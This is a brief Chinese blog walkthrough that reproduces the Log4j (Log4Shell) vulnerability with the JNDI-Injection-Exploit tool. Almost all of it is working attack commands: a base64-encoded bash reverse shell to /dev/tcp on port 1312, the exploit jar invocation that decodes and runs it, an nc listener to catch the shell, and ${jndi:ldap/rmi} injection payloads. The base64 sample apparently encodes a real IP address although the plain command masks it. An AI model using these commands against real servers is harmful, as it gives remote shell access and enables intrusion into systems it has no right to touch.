---
title: log4j复现
id: log4j复现
---

<!-- more -->



[Release JNDI-Injection-Exploit v1.0 · welk1n/JNDI-Injection-Exploit (github.com)](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)

这个payload很神奇，是看小迪迦[有道云笔记 (youdao.com)](https://note.youdao.com/ynoteshare/index.html?id=395d89aaf7069c08a59de7c2e9265d24&type=note&_time=1639622219489)复现的，重点在于构造反弹shell

base64编码可以避免一些传参问题

```sh
echo -n "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/1312 0>&1" | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTkuMy4yMTcuNDAvMTMxMiAwPiYx
```

```sh
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,上面那串base64编码}|{base64,-d}|{bash,-i}" -A xxx.xxx.xxx.xxx
```

![](https://s2.loli.net/2021/12/16/MI4RPoADCiKy9Qv.png)

然后另外一边再开个nc

```
nc -lvvp 1312
```

可以看到成功弹过来了

![](https://s2.loli.net/2021/12/16/CM8SZN5kwLHpvAU.png)

```
${jndi:ldap://xxx.ceye.io/a}
${jndi:rmi://xxx.ceye.io/a}
```

